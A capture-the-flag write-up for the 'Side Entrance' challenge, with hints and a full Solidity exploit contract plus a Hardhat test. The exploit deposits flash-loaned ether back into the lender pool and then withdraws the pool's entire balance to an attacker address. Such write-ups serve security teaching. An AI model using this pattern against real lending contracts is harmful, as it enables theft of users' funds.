# 4 - Side Entrance

### Hints

<details>

<summary>Hint One</summary>

You will need to deploy your own smart contract to solve this challenge.

</details>

<details>

<summary>Hint Two</summary>

This is a re-entrancy exploit.

</details>

<details>

<summary>Hint Three</summary>

The two `require` statements in `flashLoan` check the balance of the pool contract address is not less than it was before calling your contract’s `execute` function. This means that whatever exploit logic your `execute` function implements, it cannot decrement this balance. What else could it do?

</details>

### Scripted Solution

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external;
}

contract SideEntranceLenderPoolExploit {
    ISideEntranceLenderPool private _sideEntranceLenderPool;

    /**
     * @dev Constructor sets `_sideEntranceLenderPool` contract.
     */
    constructor(address sideEntranceLenderPoolContractAddress) {
        _sideEntranceLenderPool = ISideEntranceLenderPool(
            sideEntranceLenderPoolContractAddress
        );
    }

    /**
     * @dev Calls `flashLoan` on `_sideEntranceLenderPool` with `amount`.
     */
    function flashLoan(uint256 amount) external payable {
        _sideEntranceLenderPool.flashLoan(amount);
    }

    /**
     * @dev Calls `deposit` on `_sideEntranceLenderPool`, passing `msg.value`.
     * This function is called during the flash loan function execution and
     * deposits the value of the loan into this contract's account.
     */
    function execute() external payable {
        _sideEntranceLenderPool.deposit{value: msg.value}();
    }

    /**
     * @dev Withdraws this contract's balance to `attackerAddress`.
     */
    function withdraw(address payable attackerAddress) external {
        _sideEntranceLenderPool.withdraw();

        payable(attackerAddress).send(address(this).balance);
    }

    receive() external payable {}
}

```

```javascript
it('Exploit', async function () {
  // Deploy exploit contract
  const SideEntranceLenderPoolExploitFactory =
      await ethers.getContractFactory('SideEntranceLenderPoolExploit', deployer)
  const poolExploit = await SideEntranceLenderPoolExploitFactory.deploy(
      this.pool.address
  )

  // Initiate flash loan from exploit contract
  await poolExploit.flashLoan(ethers.utils.parseEther('1000.00'))

  // Withdraw balance to attacker address
  await poolExploit.withdraw(attacker.address)
})
```
